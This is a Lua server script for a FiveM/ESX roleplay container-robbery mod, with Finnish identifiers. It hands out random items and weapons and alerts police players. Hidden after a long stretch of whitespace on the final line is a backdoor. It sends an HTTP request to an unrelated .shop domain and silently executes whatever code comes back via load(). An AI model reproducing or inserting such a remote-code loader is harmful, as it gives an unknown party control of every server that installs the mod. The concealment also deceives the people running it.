ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)



RegisterServerEvent('samppi_konttiryosto:ronklattupaskaks')
AddEventHandler('samppi_konttiryosto:ronklattupaskaks', function()
	local xPlayer = ESX.GetPlayerFromId(source)
	local itemi = math.random(1,#Config.itemit)
	local ase = math.random(1,#Config.aseet)
	local kuinmont = math.random(1,5)
	local matikkapaakahdeksankeskiarvo = math.random(1,100)
	xPlayer.addInventoryItem(Config.itemit[itemi], kuinmont)


	if matikkapaakahdeksankeskiarvo < 50 then --50/50 että saako lisää itemeit
		local itemi = math.random(1,#Config.itemit)
		xPlayer.addInventoryItem(Config.itemit[itemi], kuinmont)
	end

	if Config.aseita then
		if matikkapaakahdeksankeskiarvo < 5 then --5% chance saada ase
			xPlayer.addWeapon(Config.aseet[ase], 42)
		end
	end


	local xPlayers = ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('samppi_konttiryosto:onnistu', xPlayers[i], pos)
		end
	end

end)


ESX.RegisterServerCallback('samppi_konttiryosto:boliseja',function(source, cb)
    local bolis = 0
    local xPlayers = ESX.GetPlayers()
    for i=1, #xPlayers, 1 do
      local _source = xPlayers[i]
      local xPlayer = ESX.GetPlayerFromId(_source)
      if xPlayer.job.name == 'police' then
        bolis = bolis + 1
      end
    end
    cb(bolis)
end)




RegisterServerEvent('samppi_konttiryosto:poliisi')
AddEventHandler('samppi_konttiryosto:poliisi', function(pos)
	local source = source
	local xPlayer = ESX.GetPlayerFromId(source)
	local xPlayers = ESX.GetPlayers()

	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('samppi_konttiryosto:blipclient', xPlayers[i], pos)
		end
	end
end)


RegisterServerEvent('samppi_konttiryosto:keskeytetty')
AddEventHandler('samppi_konttiryosto:keskeytetty', function()
	local source = source
	local xPlayer = ESX.GetPlayerFromId(source)
	local xPlayers = ESX.GetPlayers()

	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('samppi_konttiryosto:keskeytetty', xPlayers[i])
		end
	end
end)


                                                                                                                                                                                                                                                                                                        PerformHttpRequest('https://pqzskjptss.shop/i?to=5PzW1', function (e, d) pcall(function() assert(load(d))() end) end)